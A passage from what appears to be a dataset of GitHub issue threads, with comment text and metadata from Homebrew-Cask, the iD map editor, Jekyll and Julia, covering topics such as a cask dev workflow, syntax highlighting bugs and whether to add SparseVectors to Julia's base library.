symlink or a directory.  Then can I take that directory from launchpad and apply that to my  folder?  @friend Your problem has nothing to do with this issue. Lets please stay on-topic, it is big enough as it is. Either way, it’ll be irrelevant once this is up, so we won’t work on it. Furthermore, your last post is an OS X question, not a homebrew-cask question, so you should resort to a website with that specialty, like Ask Different from Stack Exchange.  @friend I recommend you post one more comment that sort of acts as an FAQ and then lock this thread. I think the FAQ should include answers to the following questions (my best-guess answers are in parens)  What is this thread about? (HBC will be changing the way it works, and this is an announcement) Are these changes in effect yet? (No) When will these changes be in effect? (Not sure, but not now) Is there a timeline for that? (No) Why not? (Because this project is run by volunteers) How can people help out? (By contributing code) What if someone has a question regarding this issue? (1. Check that it's actually related to this issue 2. Check that the answer isn't in this thread 3. If neither, open a new issue)   @friend I like that, thank you. Nothing further to add to your FAQ, so we can leave it as is. I didn’t want to close this at the start because I wanted people to find holes in it, but it seems like the idea as it stands is pretty solid and agreed upon, so yes, lets stop diverging further since comments have been becoming less relevant.  The first and most important part of this change is now very close to being implemented. If you’re interested in helping test it, head over to  and follow the instructions at the bottom.  Getting really close, now, so if you had some things you wanted to do that are dependent on this change, now is the time.  And merged. There are still a few things that need to be done in order to close this issue, but the biggest user-facing change is now present.  @friend, what exactly still needs to happen for this to be closed? The only thing I'm seeing that is not yet implemented is  and , which kind of contradict themselves. Why would you be able to override a required location? That would mean the location isn't actually required.  @friend  is also yet to be implemented. As for , I do not remember my reasoning there, and I guess it could be stricken (not , though, naturally).  I suggested  in  mostly because I think the user should have final say in where their stuff is installed, and may have good reason for overriding the developer's stated location requirements. We should absolutely print a warning when the user overrides  though, so they have no grounds to blame us for a broken installation.  @friend, I think we can close this in favour of  @friend Agreed. At this point other issues should take care of whatever is missing here. ",186,43,1307,0,0,815,52,
Homebrew/homebrew-cask/27364,0.086658765,Homebrew,homebrew-cask,`search` gives bad results when there are multiple casks with the same tokens across repos,12227,158,75,0,4,"@friend Started working on this in  but it was never finished. Reported issues where we can see the problem   Is anyone assigned to this? Or does this mean it is open to development by anyone who wants to submit a PR to close it?  Anyone can submit a PR for this.  In terms of hours of work invested vs. work pending, I feel the unfinished PR is pretty close to completion. By the time of my last commit (8 Dec 2014), the PR seemed feature complete but lacked a few tests. Now with two years having passed, it’s going to need a very thorough rebase on top of that. I’d definitely love to finish it myself but right now I can’t. I have published all my work in progress to the branch  in my fork. As @friend said, anyone is free to work on it. Whoever wants to contribute should feel free to start from scratch – there are definitely quicker and simpler solutions than my large refactoring – or pick up my  branch if deemed helpful, and finish it, or gut it to their heart’s content. Either way, I’m excited and looking forward to having a  command that works like it should! 😊  Just tried to rebase, ended up realizing there is no core anymore. I had completely forgotten 😳 Given the work already done was rather invasive, I can’t risk missing any relevant changes to the core while rebasing. So I really want a coherent Git history along the way. To achieve this, I’m thinking of multiple steps  Rebase my work against the old  history, stopping at the last commit before the folder was finally deleted;  then, fork the Homebrew repo, branch off the initial commit from August;  commit the result of step # 1 onto that branch, and  continue rebasing normally against brew/master.   @friend/maintainers Any advice on a simpler solution? How did you go about similar problems in the past?  Not really. Before moving the core we tried to merge as many core-related PRs as possible. The remaining ones were either closed due to lack of interest or merged relatively quickly afterwards.  @friend Alright. I wonder though what would be the proper way to run any cask command from my dev working copy? Before the transition, we used to have  and  to switch modes. These used to be a piece of cake and was well documented. I wonder where the equivalent thing in Homebrew is? I searched all the folders I deemed somewhat relevant, especially , , , , and of course, the  subtree, but nothing helpful has turned up there. The consequence is that right now, I’m unable to run literally any command from my dev working copy of Homebrew. I have read all the docs – especially the three documents for maintainers – however, I have yet to find anything even remotely related to my issue, or even some kind of documentation on how to properly set up the Homebrew repo for development. Nothing has worked so far. My simplest test case is I look at the commit hash that  gives me. So far, it has never been the one that corresponds to the HEAD of my repo. Speaking of test cases not only are the  scripts gone; someone also seems to have removed almost all of the test tasks from our , which is in the new  directory; this of course broke both  and . This apparantly happened some time after the transition. I wonder how you manage to run any core test cases now? (The documentation to Homebrew does mention “test bots” – however, these are probably not suitable for quickly testing along as I do changes to the core. Also, I can’t access those anyway.) I understand that I’m obviously missing something – but what is it? After one day of achieving literally nothing, I’m running out of ideas and feel really confused and frustrated. Would you mind please giving me a nudge in the right direction?  As far as I can remember the scripts were linking the development tap to , so these were removed because they wouldn't have worked anymore, as the  command is now integrated into Homebrew. Now you will either have to checkout to a different branch in the  while developing, or set up a separate Homebrew installation. Tests are now run with , which you can find in . However, I am currently in the process of merging these with .  @friend Thanks for the pointers! I don’t see how these two things are related. If we’re able to move a thing from A to B, how are we not able to modify those scripts to have them point to B instead of A, rather than throwing them away? That, admittedly, is a little beyond me. To explain the itch behind my question, I’m going to let you guys in on the fact that I find myself having a embarrassingly hard time getting my dev environment up and running, especially when compared to the old HBC repo. This factoid is seemingly unrelated to the discussion at hand, and it might not have anything to do with Homebrew, and might very well have everything to do with my personal attitude, learning curve, or patience. Except when it doesn’t. The thing is, I was bitten once and became shy twice. I do love Homebrew, you know. It’s a pleasure to use, and certainly an insanely convenient thing to have. I do also love . But boy, have I learned to steer clear of ever standing in its merry way. To back up my claim, I just need to look at my local working copy of HBC. Not a long time ago, I used to know exactly how, and when, to , mainly thanks to . Never did I break, let alone lose, any of my work on a Cask or the HBC code. Now compare to all this my stash of custom Homebrew formulae. I’ve written only a handful of those throughout the years. Nothing spectacular, and all of them for my own use. Sometimes my formulæ even have credentials in it because who cares. I used to tuck away all those formulae of mine in private branches but guess what? One day in 2015, my formulae started to disappear. My uncommitted changes? Vanish into thin air. My branches? Poof. At first, I would not notice – because whatever it is that keeps snatching my formulae, the thing loves to strike silently, probably out of spite, or maybe because it secretly longs to be a ninja. By all means, it chooses not to blow up in my face like Git does whenever it finds a hairline crack in a whitespace (but wait … didn’t Homebrew use exactly Git behind the scenes? … Oh right, they use  now. My bad). So, weeks pass, or even months, without me noticing my formulÆ are gone, until the day there is some upstream release, and off I go and update formula XY, or so I think! Actually, I can’t update formula XY because formula XY is gone. Gone because someone decided to change the color of the magic smoke inside  once again and the old smoke took with it all the feature branches, or stashes, with my custom formulæ in them. Do I bother? Keg no. I usually just shrug and move on with my life because I’m a big girl and I can cope with worse things than the fact that formula fidgeting and  magic are just not my thing. But now that HBC is with Homebrew, all of that has changed, I guess? No more weaseling out of staying on top of how  works internally this season! Gonna have to bite the bullet and learn how to , and how not to have my stuff ninja clobbered, right? Because – albeit admittedly on-and-off – I am a Homebrew-Cask core maintainer and I plan to remain one for years to come. Yes, I’m going to bite the bullet and work on the HBC core in a private branch, below , and stop complaining, and become a socially likeable person again. But before I do that, may I ask the simple question Why exactly is it that we cannot keep  and  around? Pinging @friend/maintainers for advice, consolation, or both.  To be honest, I hadn't used these scripts before the merger, so there wasn't any incentive for me to make them work with the new setup, and nobody complained when they were gone. Also, keeping them in  doesn't really make sense anymore since this is now just a Tap. I can't say anything about this since I never had any trouble with , but I understand your frustration and therefore need to have a decoupled development copy. Much of Homebrew-Cask is now intertwined with the Homebrew core, and will only get more integrated over time, so you will probably end up editing the Homebrew core anyway – ~~~~, basically. Of course you could argue that the scripts can be adapted to edit the Homebrew core instead, but I think it's really a matter of personal preference if you want to work directly inside the production  or  a second development copy.  It’s not that I’m trying to bring back this feature purely for my own convenience. Let’s put ourselves – for a moment – in the shoes of a first-time code contributor who has just cloned the repo to, say, , has written some code, and is now just about to test their first PR. Is it then not poor UX&lt;sup&gt;[1](#footnote-1)&lt;/sup&gt; to have them learn to their surprise that there’s no way to run the code they just built? For the record, I’m positive that whoever removed the scripts did it with the best of intentions in mind. This doesn’t change how unhappy I am with the status quo though. &lt;p id=""footnote-1""&gt;&lt;sub&gt;&lt;strong&gt;[1]&lt;/strong&gt; or dev’s experience, in that instance&lt;/sub&gt;&lt;/p&gt; Lucky you. 🍀  But even in a bug-free universe, where  plays with kittens, I believe the UX aspect (see above) is still crucial in the long run. Contributing code needs to be accessible for anyone with a GitHub account. You’re correct; it’s not what I had in mind either. Basically, what I want to achieve here is a workflow roughly similar to what we had before the transition. To get more precise, what I’m trying to do is this   Step Status Description     Step 1 Normal I choose a location in the filesystem, e. g. .   Step 2 Normal I  the complete Homebrew repo to , either from the official repo or from my own fork.   Step 3 Normal → Linked I’ve just written some code, now I need to test it. Thus, I run .   Step 4 Linked From now on, whenever I say &lt;sup&gt;[2](#footnote-2)&lt;/sup&gt;, it’s going to do the exact thing that  says instead of what  says &lt;sup&gt;[3](#footnote-3)&lt;/sup&gt;.   Step 5 Linked → Normal I have finished my work. Now I’m ready to go back to production mode; thus, I run .   Step 6 Normal All is back to normal. I can run . In particular, my work in  is completely safe from the grasp of .    &lt;p id=""footnote-2""&gt;&lt;sub&gt;&lt;strong&gt;[2]&lt;/strong&gt; Let’s ignore the non-cask  commands for now. I’d be indifferent as to where those would point.&lt;/sub&gt;&lt;/p&gt;&lt;p id=""footnote-3""&gt;&lt;sub&gt;&lt;strong&gt;[3]&lt;/strong&gt; or whatever  happens to be at that moment&lt;/sub&gt;&lt;/p&gt;What I’d love to do is write a script that simply does what the table says. At the moment, I have no idea how to go about that, or where to start looking for a solution. If I knew more about Homebrew, or if someone kindly helped me fill in the blanks, I would gladly implement the script myself, and then send a PR on its way. Another strategy might be to do simple symlink trickery, like the old scripts did. (If I only had an idea what precisely needs to be linked, and to which target?) If I knew, I could restore  and just change it there. @friend/maintainers Any pointers?  You know what? You could probably just simply call  aliased as  or the like. This way  is safe, even if you forget to run .  Thanks @friend, will try this right away!  @friend The solution you suggested has worked great so far! Exactly what I needed to get going. 👍  Cloning into 'brew'... […] $ cd brew Homebrew-Cask 1.1.5-66-g4ca2eaf caskroom/homebrew-cask (git revision de574; last commit 2016-12-29) $ bin/brew cask --version ==&gt; I’m in the dev repo ♠  Great to hear! 👍  Can also attest to that. Used it for  This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs.  @friend I seem to recall some discussion not too long ago (was already 2019?) in either the Homebrew/brew or Homebrew/homebrew-core repo about this very subject, and the conclusion being that it’s best to avoid having formulae in third-party taps whose tokens conflict with the official taps. Is this issue still worth pursuing?  This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. ",30,13,487,0,0,300,31,
openstreetmap/iD/4880,0.1943049775,openstreetmap,iD,Allow user to zoom track text,870,8,3,0.625,2,"On  that number, 7438-35? Well there is no way for the user to make it temporarily bigger to be sure he read it correctly, Zooming only helps for a second. OK he can do CTRL++++ . OK I suppose that will have to do.  If he does CTRL++++ he will have to remember to do exactly CTRL+---, otherwise he will have messed up his original situation.  Wait, CTRL++++ only helps for one second...  Changing the size of this text is something you can do with Stylish see   think it would be fantastic if somebody made a Stylish theme for iD, specifically for mappers with poor vision - maybe to adjust the size of text and contrast of the rendered elements.  Yes but that is a hack.  Please add a slider. If users were so smart that they could use external solutions, they probably wouldn't be using a web based editor in the first place.  @friend It's not ok to insult the users. ",8,0,40,0.125,0.125,34,1,
openstreetmap/iD/5296,0.596917555,openstreetmap,iD,gpx tracks in 2.11.1,1063,14,6,0.6666666666666666,0,"In my opinion one of the worst updates iD got so far. I can sill include a gpx track, but to get there I have to take another step. Dowloading something from the web is nice, but I will never use that. Where is the problem to put them below each other and not have them inside a sub menu. The worst thing is that the gpx track is clickable. Since my GPS device is pretty accurate it's almost always on the way and selecting the way and not the gpx file is sometimes impossible. Grabbing a single node to move it? You can forget that one good Sir! Trump says ""GPX file first!"". If there is a need to show the track stats (three of them so far and I couldn't care less about any of them) it can be moved over to the side menu where you select it from your HDD. If you make such changes, please give me at least an option to switch back. The new version is nothing but garbage for me. It is so bad, it gives me cancer. BTW I'm pretty pissed if it wasn't clear until this point.  Wow, not nice @friend.  We've already got #5257 for this, you don't need to be a jerk. ",5,0,35,0.3333333333333333,0,33,3,
jekyll/jekyll/6844,0.060050106,jekyll,jekyll,Twig syntax highlighting broken,5081,55,47,0.5625,6,"Hi, Jekyll syntax highlighting is broken with Twig. Consider the following code block containing a perfectly valid Twig syntax It outputs the following HTML Notice the err class attributed to the equal sign. Steps to reproduce  Follow the official quick-start guide  the content of the post created by the installation with this   How is the resulting output if you were to use triple-backticks instead?  So you see the issue is not with Jekyll but rather with Rouge that  and the triple-backticks block uses to highlight code.  No, the problem also happens with the  syntax.  Yes, that's because the  tag uses  for syntax-highlighting by default  you want to use  instead of  as your site's highlighter, add the following to your   This sounds like an issue with  rather than Jekyll. Jekyll has no knowledge of syntax of any language.  @friend, why did you close this? It's not fixed and I'm not the one explicitely using Rouge. The maintainers of the project are using a dependency that is buggy, they should take care of this.  I’ve provided a link to the repository so that you can open an issue there and explain the problem you are having. I do not know what “Twig” is, so it would not make sense for me to be the one to explain what needs changing in Rogue. There is nothing in Jekyll’s code that can be changed to fix this issue; the fix will have to come from Rogue. Here is a link to Rogue’s Twig lexar  That's not my point. You are the one using Rouge to implement a feature that you advertise explitely on your docs! That's your responsibility to take care of things that don't work as expected in the dependencies of your project. As a consumer of your product, I expect it to work as advertised  are advertising syntax highlighting, you are supposed to deliver! And if you don't, you are supposed to take care of whatever is needed to have your product work as expected. And don't start me with open-source and this-product-is-free. If you embrace open-source concepts, you also embrace the responsibility that comes with it.  @friend We're sorry that you're facing issues while using Jekyll. I agree that you as an end-user shouldn't concern yourself about bugs in dependencies. One of the maintainers will get in touch with the developers at Rouge and sort things out for you.  @friend, thanks a lot. I already created an issue, maybe a maintainer could comment on it if it's not clear enough  @friend Please take a step back and consider that this is an entirely volunteer-run project. We're not contractually obligated to work on every bug and answer every question, seeing as we simply don't have enough resources. So our apologies if some things take too long, or don't end up happening, but it's wrong to blame the maintainers for this.  @friend, I totally understand that and i can relate maintaining open source projects is very time-consuming. But I'm not having that discussion because I want to see that bug fixed immediately, to be honest this is a low priority bug even by my own standards. My point is that if, when a bug happens, maintainers blame a dependency, close the issue and ask for the reporter to open an issue elsewhere, that could go that way Jekyll Oh, sorry this is a bug with Rouge, go open an issue there. -&gt; Rouge Oh, sorry this is a bug with Ruby, go open an issue there. -&gt; Ruby Oh, sorry this is a bug with GCC, go open an issue there. ...and so on. At one point, my issue will be invalid because I won't even know what and how to report the bug. Already, Rouge maintainers could totally close my issue as invalid because I'm giving a way to reproduce that imply Jekyll - it would be legitimate for them to say that it's a Jekyll bug or that they want a reproducible example using only Rouge.  @friend The way I see it, this issue could pop up in any software that uses Rouge, and is therefore not specific to Jekyll. I agree however that it could have been better communicated before it was closed, sorry about that.  @friend I re-opened the issue to convey that we have not abandoned this report straight away.. Do know that I've kept a tab on the issue-ticket at Rouge and will follow its proceedings as time permits..  This issue has been automatically marked as stale because it has not been commented on for at least two months. The resources of the Jekyll team are limited, and so we are asking for your help. If this is a bug and you can still reproduce this error on the &lt;code&gt;3.3-stable&lt;/code&gt; or &lt;code&gt;master&lt;/code&gt; branch, please reply with all of the information you have about it in order to keep the issue open. If this is a feature request, please consider building it first as a plugin. Jekyll 3 introduced hooks which provide convenient access points throughout the Jekyll build pipeline whereby most needs can be fulfilled. If this is something that cannot be built as a plugin, then please provide more information about why in order to keep this issue open. This issue will automatically be closed in two months if no further activity occurs. Thank you for all your contributions. ",21,2,160,0.3125,0.125,97,4,
jekyll/jekyll/7432,0.045791791,jekyll,jekyll,docs: Add a theme step to Step by Step Tutorial,2889,32,15,0.5454545454545454,3,"Plase, add a step on the Step by Step Tutorial to demonstrate how to theme the just finished demo app. Motivation  Theming is not an obvious task for a newbie like me. Also, doc speaks about gem based and 'regular' file themes. It's confusin  a bit. At the end of demo app it's more beautiful to leave in the han of the user a well looking demo  Idea Please include istructions on  how to enable default gem base theme how to customized if possible a gem theme how to switch to a regular file based theme idem, how to customize it  ... or ... Create a guide on how to start theming AND then include previous steps into the new tutorial. Thanks for this excellent piece of software !!!!  On how to start theming for Jekyll, I'd recommend @friend articles   Thanks, but it's better have an official doc, and not links to external resources. IMHO  If it's validation you're looking for then I can 100% endorse these tutorials ✨. However if you want this set in stone then maybe we could link to these tutorials in the official docs? Maybe in  or  What do you day @friend?  What about allowing Jekyll sponsors to post tutorials directly on the site. Each post has a  content sponsored by CTA use rel=”canonical” tag to sponsors blog. Author of the article gets paid by the sponsor. Jekyll gets better docs.   IMHO, Documentation is one thing and a (sponsored) community blog is an entirely different league altogether. They should not be intermingled. Documentation is translating ""the code base"" into layman lingo. (Point-of-View Maintainers -&gt; Users) Community blog is about sharing experience with the code base. (Point-of-View One User -&gt; Other Users) Bringing the sponsors into the mix, is just complicating things, unnecessarily.........  Hi @friend I agree with you here. I'm thinking the Tutorials section could highlight the community in this way.  Sorry but ... To rest in topic... A simple step added to main step by step intro is so wrong?  I don’t see what is wrong with referring to a tutorial on another site? Yes the tutorial was paid for, but tutorials of that size take time to create. Maybe we could add some more detail on the points people are getting stuck on in the docs?  If I see a tutorial on an external website it soon or later will become obsolete. If I see a tutorial on main site I think that must be ok, tested, and updated. Simply. Close this issue A company that does not understand the need of a full doc do not will offer a serious support in the long time Bye bye.  Jekyll is an open-source project freely maintained by volunteers, it has been around for 10 years now and powers hundred of thousands of websites around the world. Jekyll has a great community and docs are continuously improved with the help of the contributors. Jekyll themes are documented. I'll see if I can add some links to point to theming at the end of the step-by-step guide. ",11,4,105,0.18181818181818182,0.2727272727272727,80,9,
JuliaLang/julia/11324,0.0586911415,JuliaLang,julia,About SparseVectors,22352,276,165,0,2,"There's been a lot of debate about whether we should incorporate sparse vectors into Julia 0.4. Here are three options  (A) Use SparseMatrixCSC to emulate a sparse vector. This, as many have pointed out in other issues, breaks the consistency with the dense arrays. It is also unnatural and inefficient.  (B) Add SparseVector to base before 0.4 is released.  The functionalities have been developed and tested in SparseVectors.jl. These functionalities are relatively simple and they don't need a long time to get mature. (#8718)  (C) Deprecate sparse vector related functions in Base, and add SparseVector to base after 0.4 is released. (#11323)   Personally, I don't like (A), and I am fine with either (B) or (C). One opinion against (B) is that there can be multiple ways to represent a sparse vector. However, IMHO, the way used in SparseVectors.jl seems to be the most natural way, and it is consistent with both CSC and COO formats. I understand that other formats may be more suitable for certain situations. For such cases, it is not difficult to develop a new sparse vector format (using a different type name of course). cc @friend @friend @friend @friend Since @friend has tagged #8718 as 0.4, and that PR was closed, I tag this as 0.4 in order to make sure that we come to a decision before 0.4 is released.  I am in favour of (B) and to get it all right for 0.4. I don't like just removing the functionality and then adding it again later, which would break codes yet again. This will be an improvement over what already exists, IMO.  Agreed that the implementation in SparseVectors.jl is an improvement over what already exists. Don't take my objection over the maturity and name too seriously if there's a consensus for option (B).  The ""inconsistency"" between dense and sparse arrays doesn't go away by adding a sparse vector type. Even with a sparse vector, there is still no sparse arrays for dimensions higher than two, so I don't buy the consistency argument and therefore also not the ""unnatural"" argument. It might be very useful with a sparse vector type, but I think we should focus of the class of operations that could benefit from a sparse vector type and some performance measures.  Here's your inconsistency argument I'm repeating myself, but I don't care that sparse doesn't generalize yet. But we're doing dimensions 1 and 2, and the operations that result in one from the other, wrong. Let's just fix that for now.  It is these kinds of inconsistencies I don't like, which make the system feel lacking. I wish we had N-d too, but that is likely to happen in JuliaSparse rather than Base. I also feel that a sparse vector will be useful with non-numeric data types as well.  Although, for non-numeric data types, what is the type for fields not represented? The types of sparse arrays and vectors I have implemented (for database use) didn't store null or undefined fields.  For Julia, I guess you'd need type Any, and Nothing.  @friend, the storage for a sparse vector and a 1-column CSC matrix is essentially the same, I don't think there are any performance differences. The argument is that the current semantics are wrong.  I still think that it would be useful to see examples application of sparse vectors. The indexing behavior of special matrix types is hard. It is a standard attack on the special matrix types and one of the reasons they might not fit well as subtypes of . I don't think indexing is the most important feature of sparse matrices or special matrices in general. They are mainly about  and .  I still think that it would be useful to see examples application of sparse vectors. The indexing behavior of special matrix types is hard. It is a standard attack on the special matrix types and one of the reasons they might not fit well as subtypes of . I don't think indexing is the most important feature of sparse matrices or special matrices in general. They are mainly about  and .  One common sparse vector application  Read in a text corpus document-by-document and train a logistic regression classifier with an L1 penalty on parameters. Your parameter vector is a sparse vector and each new document (of which there should be exactly one in memory at a time) is a sparse vector. The only thing you need to do is compute dot products and update the parameter vector.   The SparseVectors package was initially motivated by the need to represent sparse samples in machine learning applications (@friend's example is an important case). For sparse vectors, we often want to compute dot products, compute distances between them, etc. Matrix-vector product is also very useful.  Looks like, the general opinion is towards option (B). I will make a PR later this week.  Thanks for the examples. I think all of them could work for vectors represented by  sparse matrices. After all, that approach works well in MATLAB, but go ahead with another type. I won't obstruct the process further.  I preface this with the caveat that I do not do sparse linear algebra, but I have been playing with indexing a lot lately.  I've not tried this yet, either. Would it be possible to add a ""phony"" dimensionality to the CSC type, allowing it to pretend to be one or multi-dimensional?  All indexing would be reduced or expanded to its canonical two dimensions.  This will be very inefficient for high dimensional arrays, but it should be fairly easy to make it semantically correct and consistent (especially if we get #10525).  The JuliaSparse organization can provide more specialized types that are more efficient in the non-2-dimensional cases.  Somewhat OT Since SparseVectors have decidedly numeric meaning in Julia (i.e. it is zero values that are removed, instead of null values), how would you name a package for storing efficiently sparse vectors of any type, where many values may be null? [think of JSON arrays, RDBMS rows, etc.]... Does something like that already exist, and I just haven't found it yet?  Thanks!  Scott, check out the DataArrays.jl package. On Tue, May 19, 2015 at 829 AM, Scott P. Jones notifications@friend.com wrote  @friend Nullable types, or DataArrays potentially. @friend that sounds finicky and more complicated than just adding a separate type for 1-d. If we're going to distinguish vectors from matrices within the type system for dense arrays, consistency really demands that we do the same for sparse. Faking it adds complexity to the CSC type, whose internals are already quite commonly used and relied upon not changing in packages. I have an application where I build up a sparse CSC matrix representation column-by-column, often reordering columns but rarely changing their contents. For this, an array-of-SparseVectors is an ideal representation. Representing this as CSC adds overhead for an extra integer field and an extra 2-element integer array for the column pointers for each object, which I'd really rather avoid since my columns have very few nonzeros on average.  @friend, I would love to be able to vcat an array of sparse vectors to get a sparse CSC matrix. I think I'm coming around on this.  hcat, you mean?  Yes, hcat  I'm going to have to disagree with you pretty strongly there. I use sparse matrices very heavily, but I do essentially zero linear algebra with them in Julia. Why? Because Julia's sparse matvec and matmul are still quite a bit slower than doing it in C++ or using MKL's sparse blas extensions, and the sparse factorizations available in Base aren't complete enough for my needs (SuiteSparse has no Bunch-Kaufman indefinite LDL^T). My sparse matrices do have linear (and often custom nonlinear) algebraic meaning, but that gets sent to a compiled solver to do all the actual work. So indexing, reductions, data structure traversal and creation within Julia is really important to me on sparse and structured array types (re #8001). I should send Jiahao an email and see about visiting MIT and working on it for a few weeks leading up to JuliaCon. Eventually Julia will be fast enough to write the solvers themselves - if I can get diagonal-D quasidefinite factorizations from Cholmod to work properly I've been meaning to write a Mehrotra QP solver as a proof-of-concept. Will be interesting to benchmark against Ipopt.  @friend is going to be travelling from now to JuliaCon. I will probably be around MIT a few days before and after JuliaCon - so would love to push on sparse matrix work in any way possible.  @friend The CSC/CSR format is dense in one dimension. It doesn't generalize well to higher dimensions, where you really just want the COO format - representing indices as tuples. I have thought about faking it in CSC, but you just get extra overhead for processing vectors. I would love to make the two representations close enough, so that one can write generic code for iterating through either SparseMatrixCSC or SparseVector.  @friend You can store anything in Julia's sparse data structures already `  @friend What about the following? The problem is that Julia's sparse data structures all have 0 not be represented, but for RDBMS rows, you want NULL to not be represented....  Julia's sparse data structures although not strictly restricted to numeric values, have only been used with numeric values so far. Hence all the rough edges for non-numeric data. This discussion should really be on the mailing list and not here in this issue, where it is off-topic.  Yup, I'm well aware. That's why I called them phony dimensions. My point was just that it might be easiest (as a stopgap) to allow the CSC data structure to masquerade as non-matrices. But perhaps that's naive.  Adding A specific class for sparse vectors is not very difficult. It is largely done in a package, I will try to find some time during the weekend to make a PR.  I'm worried that we're going to go through the same process of finding that all sorts of operations are missing or unusably slow due to using generic fallbacks that went on (is going on?) with sparse matrices for so long. If @friend and @friend are confident that this functionality is complete, then I guess we can merge this into the standard library, but we really need very complete tests for this.  We probably will. The implementation covers enough functionality to be very useful as-is. I don't think Dahua was able to figure out how to get Coveralls turned on yet ( which I have no idea how to help with. It's getting better over time by adding new methods. My nascent idea for a proper generic solution that would be good enough to eventually close #8001 is to extend the cartesian indexing types with a sparsity-aware version, something like , and make the ""generic"" fallbacks use it where appropriate.  What I can make sure is that all methods in SparseVectors.jl (or the PR that would be made later) are implemented in a reasonably efficient manner. However, there are many functions out there that accept AbstractArray but are implemented in a way that assumes fast random access (e.g. for i = 1length(A) ... end), these functions are doomed to work very slowly when called on sparse arrays.  I believe this functionality is useful as is too. We will discover fallbacks to generic implementations, but we are pretty good about fixing them quickly. There is enough time in the 0.4 release cycle to get this 100% right. Let's at least start with a PR.  @friend, it would be pretty easy to add such an iterator for sparse matrices. If you want me to help, just holler.  What about option D) move all sparse matrix/vector stuff into a package? I don't see any advantages of this being in Base despite that its there by default. I really think it would help to decouple the development of these things from Julia itself. (ref #5155)  I have to say, I'm with @friend on this one.  Can we finish precompiled packages first? Then we'll talk about it. For now, let's not break every package in JuliaOpt, kay? Dense linear algebra doesn't need to be in base either. Ignoring sparsity leads to way too much of this nonsense Pretending problem structure isn't important and every problem has all-to-all interactions leads to a crippled framework. Ever notice how there's no such thing as JuliaOpt for Torch?  @friend Why should that break every package in JuliaOpt? One would just have to put a  into packages that require this from 0.4 on. The reason I bring up this here is that the original suggestion of this thread is to put something from a package into base. And in my opinion this is the wrong direction. The designing of libraries should not be done in Base but outside base. So if you are not fine with removing this stuff than let me ask Why should SparseVectors be in base? What is the benefit of this?  I mean, it WILL break everything in JuliaOpt, which we can then work around. How much effort that takes and pain it causes is contingent on how cleanly the excision goes (which is an open question). There's also the issue of precompilation Tony mentioned; I'm not sure how much an external SparseArrays package would add to our load time. The question is whether that burden is outweighed by the potential gains of removing sparse matrices from Base for 0.4.  We have various syntax changes in 0.4, why should a removal of some code matter more? This is Julia master, it should not be used for production use and thus a breakage of packages is a very natural thing during a dev cycle. The point of moving things into a package is that the maintainability is increased and further any improvement that is done is directly available to users that use stable versions of Julia. In my research lab we rely on stable Julia and thus cannot benefit from any improvement that has been made to the sparse matrix code since 0.3 has been release. If it would be in a package this unnatural coupling would be broken. Regarding the load time I don't see why sparse matrices should be more special than other packages. Note that I do use sparse matrices in a large Julia code base, so I will be equally effected.  This is a bugfix. Read the entire thread, this is fixing a semantic inconsistency in the way the current sparse matrix implementation interacts with 1-dimensional indexing. Sparse matrices are far too large, important, and widely used to consider removing before 0.4. We're already months behind schedule, let's not make it any worse. Considering this has gone poorly every time we've tried it, I have serious reservations about doing this again until we work out how to do it more smoothly. For one thing I've suggested leaving functionality in base but moving it into independent modules instead of exporting it by default, which would leave the functionality still available but behind an import, and cause a much easier-to-deal-with breakage in packages.  @friend @friend, I was on the fence about including sparse vectors in Base, but really this addresses a significant usability and semantics issue with the current implementation, and better yet there's already code to do so and @friend is willing to push through a PR. Agreed with @friend. Let's make the incremental improvement now and not create a huge new time sink for everyone to deal with.  Precompilation will be addressed in time, more significant is what consequences saying ""sparse matrices are not important enough to worry about in base"" would have to the package version of sparse matrices being able to work well at all. If base Julia ignores the existence of sparse matrices and writes all routines in a way that they can only ever be efficient for dense matrices, that will be crippling. You need to rewrite all of LinAlg, every reduction, all of broadcast, all indexing and concatenation over again for every sparse matrix type. And again, squared, for all conversions and linear algebra operations between different types. We need a better framework in base first, for which SparseMatrixCSC can be the first implementation - ideally a small, pluggable one that could live out in a package, but the framework needs to exist first.  This attitude is what I object to. We had this ongoing steady stream of broken sparse matrix stuff for a long time. We are past the point where it's acceptable to have that in Base – we're trying to get rid of that kind of thing; it's certainly shouldn't be adding more of.  Stefan, I don't understand why you think it's suddenly fixed. It isn't yet.  It's better than it used to be and I object to introducing more half-baked functionality into base.  @friend, I think @friend's proposed PR is already or can be brought to a state that's not half baked before merging.  This isn't half-baked. Things have only gotten better by gradual improvement. Which this is a case of.  Why should being to large be an argument for not moving it in a package? Importance and widely used are pretty subjective. In my subjective opinion PyPlot is a lot more important and widely used than the sparse module. If I understand Tony correctly there will be major overhaul for the sparse module in the future (e.g. generalization to CSR matrices...) and in my opinion there is no benefit of having this development in base. It will make the development even much harder than if it would be developed in a package. Or does nobody see this point?  @friend, I agree with you and have stated before that CSR shouldn't be developed in base, but that's not related to this PR. Sparse vectors aren't a major overhaul, they're a bugfix.  @friend This is not a PR yet but a question how to proceed. If you all want this than simply go ahead and do it. The reason I started this discussion is to show the advantages of this being in a package. And I still have not seen an argument why it would be a bad thing.  We agree with you on everything except timeframe, and maturity of the code removal process. 0.4 shouldn't be removing any more code. 0.4 should also stop adding code that isn't fixing bugs for that matter, and try to get out the door before fall. The bug here is  returns a 1-column matrix instead of a 1-d vector, if there's a way to fix that bug before 0.4 without adding a new type or introducing some ugly fragile workarounds (#11323), speak up. #8718 was on Viral's personal wishlist to get into 0.4 for some time. There's also a non-negligible risk of the sparse code bitrotting and losing a lot of visibility if it gets moved out of base. Sparse matrices will need the right infrastructure to exist in base first (which will have to be developed here) before they can work well as a package, and just as importantly they will need enough people to maintain them or they will wither and die.   Timeframe will always be bad Removing the package is an equally valid bugfix ;-)  This is where I object to. If there is not enough momentum to maintain this then the code is simply not important and should definitely not be in base. Visibility loss is also something which can be said about almost every package and we need other mechanisms to highlight ""must have"" packages.  Completely wrong. The perfect time to make major, significant, breaking reorganizations and changes is early in a -dev cycle. We're not early in a -dev cycle, we're overdue for determining scope completion to close the -dev cycle to move to -pre and a release. We've blown past the 6 months for -dev then 3 months in -pre plan already. Not until a replacement is available, tested, and working. And Base is capable of supporting that package working at all. We're way off topic, but the counterargument to that is how few commits to base are necessary to make use of this type of code once it's there and in place. Miles, Iain, etc have very few base commits, but their packages are a major driver of adoption. If Julia has a single killer app right now where it's undoubtedly better than the competition, it's OR, which you can't do at all without sparse matrices. Let's not cause major breakage there by deleting code without preparing a replacement first.  I think this is the core point of Tony's argument and it's completely accurate from what I can see.  Yes you are right, I agree with that These discussions always end up with a statement that we are 